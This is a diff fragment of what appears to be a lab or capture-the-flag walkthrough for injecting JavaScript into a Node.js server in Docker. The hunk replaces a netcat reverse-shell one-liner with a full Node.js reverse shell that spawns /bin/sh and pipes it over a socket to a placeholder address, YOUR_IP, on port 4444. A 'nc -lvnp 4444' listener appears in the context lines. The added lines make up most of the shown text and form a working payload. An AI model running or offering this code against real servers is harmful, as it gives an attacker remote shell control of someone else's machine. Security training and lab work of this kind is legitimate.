@@ -122,9 +122,17 @@ nc -lvnp 4444
 We need to tell the server to connect back to your computer.
 **Important**: You need your computer's IP address reachable from Docker (try `hostname -I` or check your network settings). Let's say it's `YOUR_IP`.
 
-The Javascript code to inject is:
+The Javascript code to inject is a bit more complex because we can't rely on `netcat`:
 ```javascript
-require('child_process').exec('nc YOUR_IP 4444 -e /bin/sh');
+var net = process.mainModule.require('net');
+var cp = process.mainModule.require('child_process');
+var sh = cp.spawn('/bin/sh', []);
+var client = new net.Socket();
+client.connect(4444, 'YOUR_IP', function() {
+    client.pipe(sh.stdin);
+    sh.stdout.pipe(client);
+    sh.stderr.pipe(client);
+});
 ```
 
 ### 3. Send the Exploit
